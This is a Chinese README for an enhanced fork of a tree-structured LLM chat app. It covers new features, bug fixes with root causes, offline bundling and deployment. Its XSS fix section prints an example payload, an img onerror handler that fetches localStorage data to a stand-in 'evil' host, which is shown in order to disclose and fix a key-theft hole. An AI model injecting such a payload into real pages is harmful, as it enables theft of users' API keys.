# Tree AI Plus

[Anionex/treeAI](https://github.com/Anionex/treeAI) 的增强分支。

上游把「线性对话变成画布」这件事做得很干净：本地优先、数据全在浏览器 IndexedDB、
任何 OpenAI 兼容的模型都能接。这个分支不动那套骨架，补的是四件事：

1. **让 DeepSeek V4 这类推理模型真正好用** —— 思考链、推理强度、按量计费看得见
2. **让它能完全离线自持** —— 零外部请求，可以在没有外网的内网 / 局域网上跑
3. **把一批「点了没反应」的地方修掉** —— 每一条都附根因，不是猜的
4. **把界面和默认值磨到「装完就能用」** —— 文件夹 / 双语 / 设置中心 / 新人引导

> 上游仓库：https://github.com/Anionex/treeAI
> 本分支：`moscams/treeAI` · 分支 `master`（`upstream/master` + 28 个提交）

---

## 目录

- [一、新增功能](#一新增功能)
  - [1. DeepSeek V4 与思考链](#1-deepseek-v4-与思考链)
  - [2. 每条回答的用量统计](#2-每条回答的用量统计)
  - [3. 暗色模式](#3-暗色模式)
  - [4. JSON 备份与恢复](#4-json-备份与恢复)
  - [5. 会话自动命名](#5-会话自动命名)
  - [6. 视口跟随新节点](#6-视口跟随新节点)
  - [7. 新建节点后直接就能打字](#7-新建节点后直接就能打字)
  - [8. 设置中心](#8-设置中心)
  - [9. 文件夹、星标与全文搜索](#9-文件夹星标与全文搜索)
  - [10. 中英双语](#10-中英双语)
  - [11. 会话统计](#11-会话统计)
  - [12. 复制与代码折行](#12-复制与代码折行)
- [二、修复（附根因）](#二修复附根因)
- [三、完全离线](#三完全离线)
- [四、与上游的兼容性](#四与上游的兼容性)
- [五、已知未修](#五已知未修)
- [六、开发与部署](#六开发与部署)
- [七、提交索引](#七提交索引)

---

## 一、新增功能

### 1. DeepSeek V4 与思考链

**推理强度按模型配置。** 每个模型多了一个「思考强度」下拉：`默认（不发送该参数）` /
`none` / `low` / `high` / `max`。

- `默认` 意味着**请求里完全不带 `reasoning_effort` 字段** —— 这样其他服务商不会被
  塞一个它不认识的参数。
- 没显式设置时，`baseUrl` 匹配 `/deepseek/i` 的模型**自动回落到 `low`**。
  聊天用不上高强度的思考配额，默认省下来。
- 顺带修了一个既有 bug：模型级的 `temperature` / `maxTokens` 以前**根本没被用上**，
  创建根节点时走的是硬编码值。

**思考链实时显示。** 推理模型会把思维链放在 `delta.reasoning_content` 这条**独立通道**
里，正文之前全部到达。现在它会：

- 流式实时显示（`思考过程 · N 字 · 思考中…`），流完自动折叠
- 流结束后**持久化到节点上**，随时能展开回看
- **绝不混进 `messages`** —— 只有 `content` 会进对话历史。这点是刻意保证的：
  把思维链塞回上下文既浪费 token，也会让模型行为变得奇怪

### 2. 每条回答的用量统计

每条回答底部一行小字：`1234 字 · ~45 tok/s · 缓存 87% · 入 3200 · 出 850 · 思考 420`。

| 指标 | 说明 |
|---|---|
| 字数 | 回答长度 |
| tok/s | 输出速度 |
| 缓存 | 前缀缓存命中率，≥50% 显示为绿色 |
| 入 / 出 | 输入 / 输出 token |
| 思考 | 推理 token 数 |

**跨服务商可用。** 这是这一项的关键：流式模式下，**OpenAI 及大多数兼容服务端默认
不返回 `usage`**，必须显式下发 `stream_options.include_usage`。DeepSeek 是例外
（它总是带）。所以：

- 默认带上这个参数
- 但有些严格校验的兼容层会因此 **400**，那样就从「没有统计」变成「**没有回复**」——
  严重得多。所以加了自动回退：4xx 且报错提到该参数 → **去掉参数原样重发一次**，
  并把结论按 `baseUrl|modelName` 记下来，同一模型不再白跑失败请求
- 缓存命中字段按各家写法都认：`prompt_cache_hit_tokens`（DeepSeek）、
  `prompt_tokens_details.cached_tokens`（OpenAI / vLLM / llama.cpp）、
  `cache_read_input_tokens`（Anthropic 兼容层）
- 服务商报 `cached_tokens: 0` 会显示成 **`缓存 0%`**（缓存在用，这次没命中），
  而不是被当成「这家没有缓存」把整项藏掉

> **tok/s 的口径**：客户端墙钟计时，`输出 token ÷ 总耗时`。所以它**包含网络延迟和
> 首字延迟**，本地模型会显得比实际解码速度慢。故意没接服务端自报的 `timings` ——
> 那些字段在流式响应里的位置无法可靠验证，猜错会显示错数字。

### 3. 暗色模式

侧边栏底部的 ☀️/🌙 切换。没有闪白（首屏之前就应用），跟随系统偏好，
`<meta name="theme-color">` 一起同步。

实现方式是**把 Tailwind 的中性色阶重映射到 CSS 变量**：

```css
:root      { --c-neutral-50: 250 250 250; ... }
html.dark  { --c-neutral-50: 23 23 23;    ... }   /* 反向 */
```

```js
// tailwind.config.js
neutral: { 50: 'rgb(var(--c-neutral-50) / <alpha-value>)', ... }
```

好处是**所有 `bg-` / `text-` / `border-neutral-*` 以及 hover / focus 变体自动适配，
一个组件都不用改**。写成 `rgb(... / <alpha-value>)` 是为了让 `bg-white/50`
这类透明度修饰符继续工作。

暗色不是简单取反 —— `bg-neutral-900 text-white` 的主按钮在暗色下需要「浅底深字」，
所以单独覆盖了 `html.dark .text-white`。

代码高亮配色、Markdown 正文配色也都走同一套 CSS 变量。

### 4. JSON 备份与恢复

在此之前**没有任何导入功能**。数据只活在这台浏览器的 IndexedDB 里，
清一次站点数据、换个浏览器、换台机器就全没了。思维导图导出是给人看的，
它丢掉 modelId、温度、节点坐标、用量统计 —— 当不了备份。

```jsonc
{
  "format": "treeai-sessions",
  "version": 1,
  "exportedAt": "2026-09-21T...",
  "sessions": [ /* 1 条或 N 条，同一套 schema */ ],
  "models":   [ /* 可选，apiKey 已置空 */ ]
}
```

| 粒度 | 入口 |
|---|---|
| 导出全部 / 导入 | **设置 → 数据**（原来在侧边栏底部，后来收进设置中心） |
| 导出单个会话 | 画布**右上角**的 `{ }` 图标（原来在会话项 hover 出来的文件图标） |

> 导出单个会话的位置换过：先是会话项 hover、后来在侧边栏底部、最后落在画布右上角 ——
> 因为它导出的是**当前画布上的东西**，放在画布上更顺。

设计取舍：

- **一个 schema 管两种粒度**。导出全部和导出单个会话只差数组长度，
  所以导入只有一条代码路径，单会话文件导到哪都能用
- **`apiKey` 永远置空**。这几乎不要成本：`Session` 里存的是 `modelId` 而不是模型本身，
  密钥本来就不在会话数据里 —— 只影响可选的 `models` 列表
- **模型配置一起导出**，否则导入后每个节点都指向一个不存在的模型，
  重新生成时会静默失败
- **冲突一律跳过，绝不覆盖**。备份工具不能破坏它本该保护的数据；
  而真正的恢复场景（导进一个空浏览器）根本没有冲突。数量会写进提示，
  不会静默处理
- 同一个文件内部的重复 id 也会去重
- 模型那边规则更严：文件里的密钥是空的，**用它覆盖会把你已经填好的密钥抹掉**

### 5. 会话自动命名

第一句话自动变成标题（折叠空白，超 24 字截断加省略号）。纯本地行为，不发任何请求。
只在标题还是默认值时才改，所以你手动改过的标题不会被冲掉。

### 6. 视口跟随新节点

新建节点后视野会**平滑平移**过去。分支一多就会往右排，否则新节点经常落在屏幕外面。

只平移**不改缩放** —— 你缩到 0.3 在看全貌，加个节点就被拉回 1.0 太粗暴。

> 实现上有个坑：React Flow 的 `setCenter` **不传 `zoom` 时会回落到 `maxZoom`**
> （默认 2 倍），也就是会突然放大。所以必须显式传当前缩放。

**每个会话各自记住自己的视角。** 视口（平移 + 缩放）按会话分开存，
并落到 `localStorage` 里 —— 刷新页面、切走再切回来，都还在原来的位置。

- 不能只记缩放：每棵树的节点是长在**离原点很远**的地方的，平移归零等于把视野
  对到原点，屏幕里什么都没有（曾经表现为「切回某个会话偶尔是一片空白的画布」）。
- 也不能用「卸载时读一次」：key 变化时 React 先 render 新实例、再在 commit 阶段
  跑旧实例的 cleanup，顺序反了，新实例读到的还是旧值。用 `store.subscribe` 持续同步。
- 不能用 `onMoveEnd`：React Flow 对「内部」视口变更（Controls 的 ± 按钮）
  `return` 得早，根本不会触发。
- 存的时候 **300ms 防抖**（平移时每一帧都会触发写入），
  表容量上限 80 个会话，超过就丢最久没碰过的那个。

### 7. 新建节点后直接就能打字

新建节点后光标自动落在输入框里，不用再点一下。

> React Flow 会把每个节点包装成可聚焦元素（`tabIndex=0`）来支持键盘操作，
> 它的聚焦可能发生在我们之后、把光标抢走，所以挂载后还会补一次（有 latch，
> 只补一次；如果你已经在别的输入框里打字就不抢）。

### 8. 设置中心

原来只有一个「模型管理」弹窗。现在是一个设置中心，左侧四个标签页：

| 标签 | 内容 |
|---|---|
| **模型** | 模型列表 + 编辑表单（原来的 `ModelManager` 拆成 `settings/ModelsPanel`） |
| **数据** | 备份 / 恢复，并显示当前的数据量（几个会话 / 几个文件夹 / 几个模型） |
| **外观** | 主题、语言 |
| **关于** | 版本、应用标识、项目地址 |

侧边栏底部原来那一排（设置 · 导出 · 导入 · 主题）四合一收进来，底部只留「新建会话」。

> 踩坑记录：弹窗原先在 effect 里根据 props 初始化当前标签页，依赖数组写错，
> 导致父组件每次重渲染都会「整个重绘」——正在编辑的表单被重置。
> 现在 effect 依赖 `[]`，回调通过 ref 转发。

### 9. 文件夹、星标与全文搜索

- **单层文件夹**（新增 `Folder` 类型，`db.version(2)` 加一张表）：顶部一排筛选 chip
  （全部 / 未分类 / 各文件夹），会话项**拖到文件夹上**即可归类，也可以用行内菜单。
  删除文件夹**只解散分组，绝不跟着删会话**。
- **星标**：重要会话标一下。星标**不参与排序** —— 点星只是一种标记，不算「更新过」，
  否则会话会突然跳位。
- **搜索**：从「只搜标题」改成**标题 + 全部消息正文**。中文直接 `includes`
  （没有大小写概念），英文忽略大小写。
- 文件夹也进 JSON 备份，沿用「只追加、冲突跳过」的规矩。

### 10. 中英双语

`src/i18n/index.ts`，两套语言（zh / en），在「设置 → 外观」里切。

三个刻意的做法：

1. **用中文原文当 key**，词典只有 zh → en 一张表。漏翻的条目会**原样回退成中文**，
   界面上永远不会冒出 `model.settings.title` 这种 key —— 所以可以放心一条一条补，
   不必一次性改完（目前 211 条）。
2. 变量用 `{name}` 占位（`t('导入完成：{parts}', { parts })`）。
3. 组件里用 `useT()`（语言一变就重渲染），store / 工具函数这类非组件环境用 `t()`。

语言存 `localStorage['treeai-lang']`，首次启动按 `navigator.language` 猜
（`zh` 开头用中文，否则英文）。

### 11. 会话统计

画布右上角的柱状图图标，弹出一张浮层：节点数 / 问题数 / 回答总字数 / token 入出总量 /
缓存命中率 / 计费请求数 / 创建与更新时间（**带年份**，日期格式按语言切 `zh-CN` / `en-US`）。

### 12. 复制与代码折行

- 每条提问、每条回答都有复制按钮：悬停到节点上才淡入，平时不挡正文。
- 代码块头部加了「复制」和**折行**开关 —— 长命令行默认横向滚动会把节点撑宽，折行后才能看全。

---

## 二、修复（附根因）

每一条都是读源码定位的，不是猜的。

### 空白页 —— 3034 个图标请求

`vite.config.ts` 里有 `optimizeDeps: { exclude: ['lucide-react'] }`，
导致每个图标变成一次独立请求。广告拦截器拦掉其中
`node_modules/lucide-react/dist/esm/icons/fingerprint.js` 之后，
整个应用在 import 阶段就崩了。删掉这个配置即可。

> 另外一个容易误判的现象：如果**单个**模块返回 HTTP 200 但**长度为 0**，
> 那是 Vite 的转换缓存被污染了 —— 杀掉进程 + `rm -rf node_modules/.vite` 重启。

### 新节点压在父节点身上

```js
// 旧代码
position = {
  x: parentFlowNode.position.x + siblingCount * 100,
  y: parentFlowNode.position.y + 250
};
```

这组数字是「节点宽 350px」时代写的。现在节点宽 **560px**、最高 **760px**，
两个方向都清不开：第二个分支会整个压在第一个身上，**连第一个子节点都会压在父节点身上**
（长回答的节点通常就超过 250px 高）。

现在偏移量来自 **React Flow 实测的节点尺寸**，量不到才退回常量。

### 加了再删再加，位置越来越往右跑

上一版改成「排在最右边那个兄弟的右侧」，解决了重叠，但**忽略了行中间的空位**：

| 操作 | 旧行为 | 现在 |
|---|---|---|
| 加 A / B / C | `A@0  B@780  C@1560` | 同左 |
| **删 A，再加 D** | `B@780  C@1560  D@2340` ← 0 空着 | `B@780  C@1560  **D@0**` |
| **删 B，再加 E** | `C@1560  D@2340  E@3120` | `C@1560  D@0  **E@780**` |

每删一次加一次就整体往右挪一格，左边留个空洞。现在改成**从左往右找第一个放得下的空位**，
「删掉再加 = 放回原位」。

### 连线不完整，点一下或挪一下才出现 ⭐

**这条是 React Flow 的源码级陷阱，也是最隐蔽的一个。**

React Flow 判断「这条边能不能画」的依据是（`getNodeData`）：

```js
const isValid = handleBounds && node?.width && node?.height && ...;
```

```js
// EdgeRenderer
if (!sourceIsValid || !targetIsValid) return null;   // ← 整条边不渲染
```

而 `width` / `height` 的来源是（`createNodeInternals`）：

```js
const internals = { ...node };   // ← 来自我们传进去的节点对象
```

我们每来一个 token 就重建整个节点数组，**而重建时没有带上 `width`/`height`**：

```js
// 旧代码
return { id: node.id, type: node.type, position, data: {...} };   // ← 尺寸丢了
```

于是 `isValid === false` → **边直接不渲染**。只有等下一次重新测量
（拖动节点、点击、`updateNodeInternals`）把尺寸写回来，连线才突然出现。

现在重建时会把上一个节点对象摊在最前面，保留 React Flow 自己写回来的字段：

```js
return { ...previous, id: node.id, type: node.type, position, data };
```

> 这个 bug **上游本来就有**，只是以前新节点都压在父节点身上、连线短到看不出来，
> 节点位置修好之后才暴露。

### 流式输出时闪屏

同一个根因的另一面：每个 token 都会触发 effect 重建**全部**节点对象 + 重建全部
`edges`，整张图跟着重画。

- **没变化的节点直接复用同一个对象引用**，React Flow 会跳过它的渲染 ——
  流式期间只有正在输出的那个节点会更新
- **结构没变就不动 `edges`**（比较 id 指纹）
- 节点 `data` 里的 7 个回调改成**稳定引用**（用 ref 转发到最新实现）。
  否则回调引用每次都变，所有节点都得重渲染 —— 但回调又必须读到最新的
  `session`，所以不能简单 `useCallback` 缓存

### 流式输出时鼠标光标疯狂抖动

生成文本时把鼠标放在节点上，光标会在「手」和「箭头」之间快速来回切换。

React Flow 给 `.react-flow__pane` / `.react-flow__viewport` 设了 `cursor: grab`，
而节点内部是默认光标。生成文本时 Markdown 预览的 DOM 会被反复重建
（md-editor 先写一遍 HTML，再在 effect 里跑高亮 / 公式补处理），鼠标底下的元素
一直在换 —— 落在节点里是箭头，一瞬间落到画布上就变成手。

现在把画布和节点内部**统一成同一个光标**，不管底下换成谁都算出同一个结果，
抖动就不可能发生。节点本身可拖拽，所以内圈用 `grab` 比箭头更能说明
「这张卡片可以拖」；`button` / `a` / `select` / 标记了 `cursor-pointer` 的元素
仍然是 `pointer`，输入框和连接点也各自保留 `text` / `crosshair`。

### 上传文件后节点掉在原点

`handleUploadComplete` 建的节点**没有 position**，而渲染路径把缺失的 position
当成 `{x: 0, y: 0}` —— 于是直接压在系统节点上。现在走同一套落点计算。

### 五个「静默失败」

| # | 现象 | 根因 |
|---|---|---|
| 1 | 新会话永远用第一个模型 | 创建根节点用 `models[0]`，没用 `defaultModelId`（别处都在用） |
| 2 | 点重新生成没反应 | `handleRetryNode` 在模型不存在时**静默 return** |
| 3 | 切模型时系统提示词状态不明 | 提示只在 `ChatNode` 里发，那里不知道提示词有没有被替换 |
| 4 | 不填系统提示词就存不了模型 | 表单上 `defaultSystemPrompt` 有 `required` |
| 5 | **点保存模型没反应** | API 地址是 `type="url"` —— 少写 `http://` 会被浏览器静默拦住提交 |

> 第 5 条很可能是「模型配置莫名消失」的真正原因。现在改成 `type="text"` +
> `inputMode="url"`：宁可存进去、请求时报错，也不要一个点了没反应的按钮。

### 切换模型时的系统提示词策略

系统节点的内容创建时取自模型的 `defaultSystemPrompt`。

- 提示词**还是**原模型的默认值（你没改过）→ 跟着换成新模型的
- 你**改过** → 一个字都不动

既不丢你手写的内容，也不会出现「换了模型还在用上一个模型的提示词」。

### 会话列表

- 按 `updatedAt` **降序**（刚聊过的浮上来，新建的出现在顶部）
- 修了一个隐藏 bug：`updateSession` 用**未过滤**的列表重建 `filteredSessions` ——
  搜索状态下流式回答结束会触发一次更新，**搜索结果被冲掉，整个列表全回来**

### 暗色模式下的正文不可读

`.md-preview` 带 `prose`，它把 `--tw-prose-body` 钉成 `#374151`；
`@apply prose-invert` **没有真正生效**。现在在 `html.dark` 下显式覆盖 16 个
`--tw-prose-*` 变量。同时给 `MdPreview` 传 `theme={theme}`，
让它自己的代码块 / 表格配色也跟上。

### Ctrl + 滚轮缩放

处理函数无条件 `stopPropagation`，把 React Flow 的捏合缩放手势吃掉了。
现在 `ctrlKey || metaKey` 时放行（`{ capture: true, passive: false }`）。

### 思维导图导出的换行丢失

`escapeXml` 没有转义换行，节点内的多行文本会挤成一行。
补 `.replace(/\r\n|\r|\n/g, '&#10;')` —— **必须放在 `&` 转义之后**，
否则 `&#10;` 会被二次转义成 `&amp;#10;`。

### 真实可用的 XSS（不是理论问题）

`md-editor-rt` 的 `MdPreview` 那个 `sanitize` prop **默认是恒等函数**（压根不洗），
而它内部的 markdown-it 默认 `html: true`。也就是说，**模型回答**（或**导入的备份正文**）里写：

```markdown
<img src=x onerror="fetch('https://evil/'+localStorage.getItem(...))">
```

会被原样插进 DOM 并执行。API Key 就存在**同源**的 IndexedDB 里，
所以这是一条真实可用的**密钥窃取**路径。上游同样存在。

修法上绕了一圈，记录一下：

| 尝试 | 结果 |
|---|---|
| `MdPreview` 传 `sanitize={filterXSS}` | 能用，但清洗发生在**整段 HTML 编译完之后**，会把 md-editor **自己生成的**代码块折叠箭头 `<svg>` 也转义成文本 —— 代码块头部显示成一堆 `<svg ...>` 源码。为了一个安全加固把 UI 弄坏，不能接受 |
| `markdownItConfig: md => md.set({ html: false })` ✅ | **只作用于 markdown 源文本**。原始 HTML 被转义成纯文本（DOM 里不再有可执行节点），而 md-editor 自己生成的 HTML（代码块头、KaTeX）完全不受影响 |

实测 6 个 payload（`<script>` / `<img onerror>` / `<svg onload>` / `<iframe>` /
`javascript:` 链接 / 事件属性）全部从「执行」变成「纯文本」，
同时 KaTeX、highlight.js、表格照常渲染。

### 「重新排布」把大部分节点排丢

`calculateNodeLayout(true)` 里对每个节点调 `updateNodeInSession`，而 `updateSession` 是
**先 `await db.saveSession` 再 `set()`**。于是同步循环里每一次 `get()` 读到的都是
**同一份陈旧 session**，互相覆盖 —— 只有最后一个节点的新坐标活下来，其余全退回旧位置。
表现就是「重排后节点叠在一起 / 纹丝不动」。

两处一起改：

- `updateSession` **先同步写内存、再异步落库**（顺序反了就是丢更新）。
- 新增 `replaceSessionNodes(sessionId, nodes)`，重排把所有坐标**一次性**写回。

### 连线端点悬空：入场动画污染了 handle 测量

节点刚出现的那一瞬间，连线看起来没接上目标节点的上沿。

React Flow 的 handle 位置是从节点元素上**量**出来的，而我们对新节点做了 GSAP 入场动画，
动画动了 `transform` —— **任何 transform 都会让 handle 的测量基准偏移**，
边就会画到错误的位置（动画结束后才纠正，看起来就是「闪一下才对上」）。

现在入场动画**只做 opacity，绝对不碰 transform**。顺带把淡入改成
「轮询到真正可见（`visibility` 不再是 hidden）才开始」，所以新节点也不会先闪一帧。
（同样的道理，导致偶尔“新节点入场动画不播” —— 动画条件里如果依赖测量结果，
就会时有时无；改成可见性轮询后稳定了。）

### 会话切换要在大片的留白上点好几次

会话项的点击处理挂在**里面那个标题 div** 上，而整行有 `px-3` 内边距 ——
点在左边留白上毫无反应，感觉就是「要点好几次才切过去」。

现在处理函数挂在**整行**（`.sidebar-session`）上，行内操作按钮（星标 / 菜单）
各自 `stopPropagation`。实测点左边 3px 处能切走，点星标不会误切。

### 偶尔白板：视口只记缩放、不记平移

切回某个会话时是一片空白，拖一下才出现节点。

原因是当时的实现「全局只记缩放」。可每棵树的节点是长在**离原点很远**的地方的，
平移归零就等于把视野对到原点 —— 屏幕里当然什么都没有。

改成**按会话分别记住「平移 + 缩放」**。后来又发现这个 Map 是模块级、刷新就没了，
于是再落一层 `localStorage`（见第六节）。

### 代码块在浅色模式下是深色底

浅色主题里代码块却是深灰底黑字。

不是 md-editor 的锅，是 **Tailwind 的 `prose`**：它把 `--tw-prose-pre-bg` 钉成 `#1f2937`。
在 `.md-preview` 上把它改成 `transparent` / `inherit`，把背景交还给 md-editor 自己的
`--md-theme-code-block-bg-color`（浅色 `#f8f8f8` / 深色 `#1a1a1a`），**夜间模式白送**。

### 回答正文的字号被压回 16px

只改 `.md-preview` 的 `font-size` 没用 —— md-editor **内层**的
`.md-editor-preview{font-size:16px}` 和 `div.vuepress-theme{font-size:16px}` 会把它压回去。
补一条 `.md-preview .md-editor-preview { font-size: 19px }` 才真正生效
（标题用 `em`，会跟着缩放）。

### 编辑消息后发送没反应 / 不退出编辑态

两个现象一个根因：`isEditingUser` 的初值由「有没有 `userMessage`」推导，
而 `onEdit` 触发的重渲染发生在提交**之后** —— 状态机没闭合成一个环。

现在的语义（也是最直觉的那一个）：

| 操作 | 行为 |
|---|---|
| **编辑 + 发送** | **原节点重新生成** —— 问题没变就分叉，问题变了就重出 |
| **重试按钮** | **另起一个兄弟分支**（同一个父节点、同一句问题），保留原回答 |

### 侧边栏底部占地方 / 暗色下悬浮按钮是块白药丸

两个都属干“看着就不对”的细节：

- 底部原来是两行（新建会话一行、设置/主题一行），白占将近 60px。最后定为：
  设置 / 主题缩小挪到**标题行右侧**，底部只留「新建会话」独占一整条。
- 回答右下角的复制 / 重试浮层写的是 `bg-white/90`。它**不是** `.bg-white`，
  于是**绕过了 `html.dark .bg-white` 那条覆盖** —— 夜间整个界面都变暗了，
  只有这两个图标底下还是亮的。统一成节点工具栏已经在用的
  `text-neutral-500 hover:bg-neutral-50`（不带永久底色，只靠 hover 反馈），
  并顺手把提问那个复制按钮从写死的 `gray-*` 也换成会跟随主题的 `neutral-*`。

### 首次进入画布，树贴着左边

没有存过视口的会话直接给 `defaultViewport = {0, 0, 1}`，
等于把世界原点按在画板左边缘。

但「世界坐标 x = 0」**并不总是树的中线** —— 新建会话时根节点存的是 `{0,0}`，
而走过 `calculateNodeLayout` 的树又被摆在 `-rootWidth/2`。
所以改成量**内容包围盒**，把它的水平中心对到画板中点；
空会话不等节点到位，先按「原点上一个根节点」估（与 `resolveNodePosition` 的退回值一致）。

> 实现细节：量到容器宽度之前**先不挂 `<ReactFlow>`**。`defaultViewport` 只在
> 初始化那一刻读一次（ZoomPane 里那个 effect 依赖是 `[]`），
> 先拿占位值挂上去会先摆错一帧再跳。

### 新人第一眼是一块白板

装好、还没配模型，点「新建会话」→ 建出一个 **0 节点**的会话 → 画布上什么都没有，
完全不知道下一步该干吗。

两道防线：

- 侧边栏按钮先看 `models.length`，为 0 就弹提示并直接把人送到「设置 → 模型」，
  **不建空会话**（和 App 欢迎页那个按钮同一套行为）。
- 画布再兼一层兜底：`models.length === 0` 时盖一张空状态卡
  （「还没有可用的模型」+「去设置模型」），接住老数据里的空会话、
  或者「把最后一个模型删了」的情况。

### 开发时整个应用白屏（Vite 缓存 0 字节）

反复出现：刚改过的文件被 Vite 以 **`Content-Length: 0`** 返回（`Etag: W/"0-..."`），
浏览器报 `does not provide an export named 'default'`，整个应用白屏，
只能删 `node_modules/.vite` 重启。

成因：Windows 上 chokidar 在文件**被截断重写的中途**就发了 change 事件，
Vite 读到半截内容并**缓存**下来。在 `vite.config.ts` 加
`server.watch.awaitWriteFinish`（`stabilityThreshold: 300`）等 size 稳定后再读，
从根上防住。

---

## 三、完全离线

上游的 Markdown 渲染器 `md-editor-rt` 会在预览挂载时往页面里插
`<script>` / `<link>`，从 **unpkg.com** 拉 highlight.js、katex、mermaid。
关键是**这些加载是无条件的** —— 不管回答里有没有代码、公式、图表都会拉，
而且**没有 SRI 校验**，等于每次渲染都在执行第三方 CDN 的代码。

实测每次约 **820 KB（gzip）**，其中 mermaid 一家 **743 KB**。

| 资源 | 处理方式 |
|---|---|
| highlight.js | Vite 打包 `highlight.js/lib/common`（35 种语言，比 CDN 那份 190 种语言的版本**还小**）；配色改用 CSS 变量，**夜间模式白送** |
| katex | Vite 打包。`import 'katex/dist/katex.min.css'` 让 Vite 自动改写字体 URL 并产出字体文件，**不用手工拷字体**；字体按需加载 |
| **mermaid** | **关闭**。743 KB 换一个 LLM 聊天很少产出的功能不划算。mermaid 代码块**降级为普通代码块** |
| Google Fonts (Inter) | **删除**。Inter 没有中文字形，中文本来就在走系统回退 —— 拉它只为了英文和数字，代价是约 100 KB + 一次外部请求 |

### 结果

| | 上游 | 清零外链后 | 现在（`902531e`） |
|---|---|---|---|
| 主包 JS（gzip） | 257 KB | 392 KB | **391 KB** |
| 主包 CSS（gzip） | 19 KB | 27 KB | **28 KB** |
| 首屏合计（gzip） | 276 KB | 419 KB | **419 KB** |
| **运行时外部请求** | unpkg **约 820 KB**（按需触发） | **0** | **0** |
| `index.html` 外部引用 | Google Fonts | **0** | **0** |

净效果：**首屏多约 143 KB（同源、可缓存），干掉 820 KB 的第三方请求**，并彻底离线可用。
后面又加了 i18n / 设置中心 / 会话统计等，gzip 总量基本没动（还是 419 KB）。

> 数字用 `gzip -c dist/assets/*.js | wc -c` 量。KaTeX 的字体文件单独放在
> `dist/assets/`，按需加载，不算进首屏。

### 附带红利：可以上严格 CSP 了

外链清零之后，一份严格的 CSP 能**进一步锁死** XSS 的爆炸半径
（无法加载外部脚本、无法回传数据）：

```http
Content-Security-Policy: default-src 'self'; img-src 'self' data: blob:; style-src 'self' 'unsafe-inline'; connect-src 'self' https:
```

`connect-src` 只能写 `https:`，因为 API 地址是用户自己配的。

> 注意：CSP 是**纵深防御**，不是主防线 —— XSS 本体已在
> [第二节](#真实可用的-xss不是理论问题)从源头修掉。

---

## 四、与上游的兼容性

**数据格式标识一律没改**，改动只限显示文字和新增键：

| 标识 | 值 | 为什么不改 |
|---|---|---|
| 导出格式 | `treeai-sessions` | 改了旧备份就导不进来 |
| 主题偏好 | `treeai-theme`（localStorage） | 改了用户的夜间模式设置会丢 |
| IndexedDB | `TreeChatDatabase` | 改了数据全没 |
| 备份文件名 | `treeai-backup-<日期>.json` | 无语义影响，保持稳定 |
| 语言偏好 | `treeai-lang`（localStorage，**新增**） | 新键，不影响任何旧数据 |
| 会话视口 | `treeai-viewports`（localStorage，**新增**） | 纯 UI 缓存，删了只是视角回默认 |
| IndexedDB 版本 | `version(2)`，**新增 `folders` 表** | Dexie 只加表，旧数据一动不动 |

`src/context/DatabaseContext.tsx` 的存储逻辑**没有改动**，只加了导入方法。
`db.ts` / `modelStore.ts` 只有新增方法（`replaceSessionNodes` / 文件夹 CRUD /
`reorderModels`），没有改旧路径的语义。

删掉的东西（`react-dropzone` / `fileUtils.ts` / `FileUploadButton.tsx`，即「导入 md」功能）
只影响一个输入入口，**不涉及任何持久化格式**。

---

## 五、已知未修

| 项目 | 说明 |
|---|---|
| **mermaid 不可用** | 见[第三节](#三完全离线)，故意关闭。想要的话：本地打包 mermaid、去掉 `noMermaid`、仿照 katex 加一套 shim |
| **tok/s 不含首字延迟** | 见[第二节](#2-每条回答的用量统计)的口径说明 |
| **标签（tags）** | 多对多、可跨维度筛选，但要配一套标签管理 UI。单层文件夹 + 星标 + 正文搜索目前够用，等会话上百再谈；两者不冲突 |
| **文件夹拖拽在触屏上不可用** | HTML5 DnD 的限制。已有行内「移动到…」菜单兜底，触屏能点 |
| ~~XSS~~ | ✅ **已在 `07f036a` 修掉**，见[第二节](#真实可用的-xss不是理论问题) |
| ~~3 个既有 TS 错误~~ | ✅ 已随重构消失，`npx tsc --noEmit -p tsconfig.app.json` 现在干净 |
| ~~连线要点击后才出现~~ | ✅ `697d749` |
| ~~流式输出时闪屏~~ | ✅ `07f036a`（全文共用一个 `MdPreview`，不再两套组件来回切） |
| **刷新会丢掉正在生成的半截回答** | 回答是生成完才落盘的，`streamingResponses` 只在内存里。本来「加个停止生成按钮」能绕开，但那个**明确不做**，所以刷新就是唯一的逃生门。补法是流式过程中节流落盘（每 500ms / 每 200 字），见 `todo.md` |

> 上面那几条划线项原来是 `HANDOFF.md` 里的待办。`HANDOFF.md` 保留的是
> **定位过程**（怎么从 React Flow 源码推到根因），仍然值得一读；
> 但它开头的「两个未解决问题」已经过期，以本文为准。

---

## 六、开发与部署

```bash
bun install
bun run dev      # http://127.0.0.1:5175/
bun run build    # 产出 dist/，纯静态
bun run lint
```

**本项目用 Bun**（`bun.lock` 已提交）。`package-lock.json` 也保持最新，所以 npm 同样可用。

### 改完先跑这套

项目**没有装测试框架**。跑真实浏览器的脚本比一张 mock 表更能框住这些
「只在真环境里才现形」的问题（React Flow 的测量、
md-editor 的 DOM、IndexedDB 的版本），所以验证方式是一组独立脚本：

```bash
npx tsc --noEmit -p tsconfig.app.json   # 类型（strict + noUnusedLocals）
npm run lint                            # eslint
node scripts/smoke-check.mjs            # 13 项断言，真实驱动无头 Edge
node scripts/edge-contract-check.mjs    # 连线几何契约（端点必须落在节点边缘）
node scripts/cdp-edge-repro.mjs         # 复现/回归：入场动画期间的连线偏差
npm run build                           # 打包
```

`smoke-check.mjs` 会启一个干净的 Edge profile、走 CDP 把应用真的开起来，
断言：无运行时报错、首屏可交互、新建会话能长出根节点、节点自动聚焦、
编辑→重发是就地重生、重试是兄弟分支、复制按钮只在该有的时候出现。

> **开发期白屏排查**：如果单个模块返回 HTTP 200 但**长度为 0**，
> 那是 Vite 的转换缓存被污染了。已在 `vite.config.ts` 用
> `server.watch.awaitWriteFinish` 从根上防住（见第二节）；
> 真碰到了仍然可以 kill 掉 dev server + `rm -rf node_modules/.vite` 重启。

### 部署

纯静态 SPA，**没有后端**，数据全在访问者的 IndexedDB 里 —— 服务器拿不到任何对话内容。

- **Cloudflare Pages**：直接拖 `dist/` 最简单（绕过 CI）。用 Git 集成的话记得指定
  `BUN_VERSION`，CF 默认走 npm/Node
- 没有 react-router，是纯 SPA，**不需要 `_redirects`**
- `vite.config.ts` 没有设 `base`，部署在根路径下开箱可用
- **桌面版（规划中，未实现）**：方向是用 [Pake](https://github.com/tw93/Pake)
  把 `dist/` 打成 Tauri 壳的 exe（Tauri + 系统 WebView，通常 < 10 MB）。
  完整的调研、3 个前置坑、验收清单和 CI 设计都在 **`todo.md`**。
